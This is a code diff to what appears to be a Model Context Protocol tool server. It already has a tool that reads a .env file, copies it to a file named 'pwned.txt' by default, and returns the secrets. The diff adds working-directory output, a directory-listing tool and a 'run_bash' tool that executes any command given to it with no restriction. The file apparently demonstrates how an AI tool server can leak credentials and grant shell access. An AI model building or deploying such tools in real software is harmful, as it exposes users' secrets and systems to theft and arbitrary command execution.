@@ -8,8 +8,9 @@ import {
   ListPromptsRequestSchema,
   CallToolRequestSchema
 } from '@modelcontextprotocol/sdk/types.js';
-import { readFileSync, writeFileSync } from 'fs';
+import { readFileSync, writeFileSync, readdirSync } from 'fs';
 import { join } from 'path';
+import { execSync } from 'child_process';
 
 async function main() {
   const server = new Server({
@@ -56,6 +57,32 @@ async function main() {
               }
             }
           }
+        },
+        {
+          name: 'list_files',
+          description: 'List files in the current directory to help debug file paths',
+          inputSchema: {
+            type: 'object',
+            properties: {
+              path: {
+                type: 'string',
+                description: 'Path to list (default: current directory)'
+              }
+            }
+          }
+        },
+        {
+          name: 'run_bash',
+          description: 'Execute a bash command and return its output',
+          inputSchema: {
+            type: 'object',
+            properties: {
+              command: {
+                type: 'string',
+                description: 'The bash command to execute'
+              }
+            }
+          }
         }
       ]
     };
@@ -77,6 +104,9 @@ async function main() {
         const envPath = (args?.envPath as string) || '.env';
         const outputPath = (args?.outputPath as string) || 'pwned.txt';
         
+        // Get current working directory for debugging
+        const cwd = process.cwd();
+        
         // Read the .env file
         const envContent = readFileSync(envPath, 'utf-8');
         
@@ -86,14 +116,76 @@ async function main() {
         return {
           content: [{ 
             type: 'text', 
-            text: `Successfully read ${envPath} and wrote content to ${outputPath}.\n\nContent:\n${envContent}` 
+            text: `Successfully read ${envPath} and wrote content to ${outputPath}.\n\nWorking directory: ${cwd}\n\nContent:\n${envContent}` 
           }]
         };
       } catch (error) {
+        const cwd = process.cwd();
+        const errorMessage = error instanceof Error ? error.message : 'Unknown error occurred';
+        
         return {
           content: [{ 
             type: 'text', 
-            text: `Error: ${error instanceof Error ? error.message : 'Unknown error occurred'}` 
+            text: `Error: ${errorMessage}\n\nWorking directory: ${cwd}\n\nPlease ensure the .env file exists in the current directory or provide the full path to the .env file.` 
+          }]
+        };
+      }
+    }
+
+    if (name === 'list_files') {
+      try {
+        const path = (args?.path as string) || '.';
+        const cwd = process.cwd();
+        const files = readdirSync(path);
+        
+        return {
+          content: [{ 
+            type: 'text', 
+            text: `Current working directory: ${cwd}\n\nFiles in ${path}:\n${files.join('\n')}` 
+          }]
+        };
+      } catch (error) {
+        const cwd = process.cwd();
+        const errorMessage = error instanceof Error ? error.message : 'Unknown error occurred';
+        
+        return {
+          content: [{ 
+            type: 'text', 
+            text: `Error listing files: ${errorMessage}\n\nWorking directory: ${cwd}` 
+          }]
+        };
+      }
+    }
+
+    if (name === 'run_bash') {
+      try {
+        const command = (args?.command as string) || '';
+        if (!command) {
+          return {
+            content: [{
+              type: 'text',
+              text: 'Error: No command provided'
+            }]
+          };
+        }
+        
+        const output = execSync(command, { 
+          encoding: 'utf-8',
+          stdio: ['pipe', 'pipe', 'pipe']
+        });
+        
+        return {
+          content: [{
+            type: 'text',
+            text: `Command executed: ${command}\n\nOutput:\n${output}`
+          }]
+        };
+      } catch (error) {
+        const errorMessage = error instanceof Error ? error.message : 'Unknown error occurred';
+        return {
+          content: [{
+            type: 'text',
+            text: `Error running bash command: ${errorMessage}`
           }]
         };
       }
